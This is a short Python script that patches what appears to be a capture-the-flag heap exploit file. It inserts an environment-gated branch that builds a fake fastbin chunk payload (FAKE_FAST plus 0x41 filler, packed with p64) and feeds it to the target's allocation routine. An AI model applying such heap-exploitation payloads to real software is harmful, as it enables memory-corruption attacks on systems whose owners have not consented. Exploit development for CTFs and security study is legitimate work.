p=r"./_z_55\_z_sc55_pwn.py"
s=open(p,encoding="utf-8").read()
old="    made = 0\n    while made < nchunk:"
new=("    made = 0\n"
     "    if os.environ.get('LEAKGEO'):\n"
     "        pay = [FAKE_FAST, 0] + [0x4141414141414141] * 4 + [0] * 5\n"
     "        buy(0x58, b''.join(p64(x) for x in pay))\n"
     "        for i in range(9):\n"
     "            creams[i] = pay[2 + i]\n"
     "    while made < nchunk:")
assert old in s
s=s.replace(old,new,1)
open(p,"w",encoding="utf-8").write(s)
print("ok")
